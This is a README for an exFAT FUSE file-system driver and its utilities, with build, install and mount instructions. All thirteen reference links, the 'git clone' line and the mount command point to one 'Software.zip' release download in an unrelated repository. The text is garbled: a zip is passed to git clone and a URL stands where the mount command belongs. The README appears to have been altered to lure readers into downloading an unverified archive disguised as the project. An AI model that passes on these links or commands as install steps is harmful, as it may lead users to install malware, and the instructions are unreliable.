About
-----

This project aims to provide a full-featured [exFAT][1] file system implementation for Unix-like systems. It consists of a [FUSE][2] module (fuse-exfat) and a set of utilities (exfat-utils).

Supported operating systems:

* GNU/Linux
* Mac OS X 10.5 or later
* FreeBSD

Most GNU/Linux distributions already have fuse-exfat and exfat-utils in their repositories, so you can just install and use them. The next chapter describes how to compile them from source.

Compiling
---------

To build this project on GNU/Linux you need to install the following packages:

* [git][4]
* [autoconf][5]
* [automake][6]
* [pkg-config][7]
* fuse-devel (or libfuse-dev)
* [gcc][8]
* [make][9]

On Mac OS X:

* autoconf
* automake
* pkg-config
* [OSXFUSE][10]
* [Xcode][11] (legacy versions include autotools but their versions are too old)

On OpenBSD:

* git
* autoconf (set AUTOCONF_VERSION environment variable)
* automake (set AUTOMAKE_VERSION environment variable)

Get the source code, change directory and compile:

    git clone https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
    cd exfat
    autoreconf --install
    ./configure
    make

Then install driver and utilities (from root):

    make install

You can remove them using this command (from root):

    make uninstall

Mounting
--------

Modern GNU/Linux distributions (with [util-linux][12] 2.18 or later) will mount exFAT volumes automatically. Anyway, you can mount manually (from root):

    https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip /dev/spec /mnt/exfat

where /dev/spec is the [device file][13], /mnt/exfat is a mountpoint.

Feedback
--------

If you have any questions, issues, suggestions, bug reports, etc. please create an [issue][3]. Pull requests are also welcome!

[1]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[2]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[3]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[4]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[5]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[6]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[7]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[8]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[9]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[10]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[11]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[12]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
[13]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v2.0/Software.zip
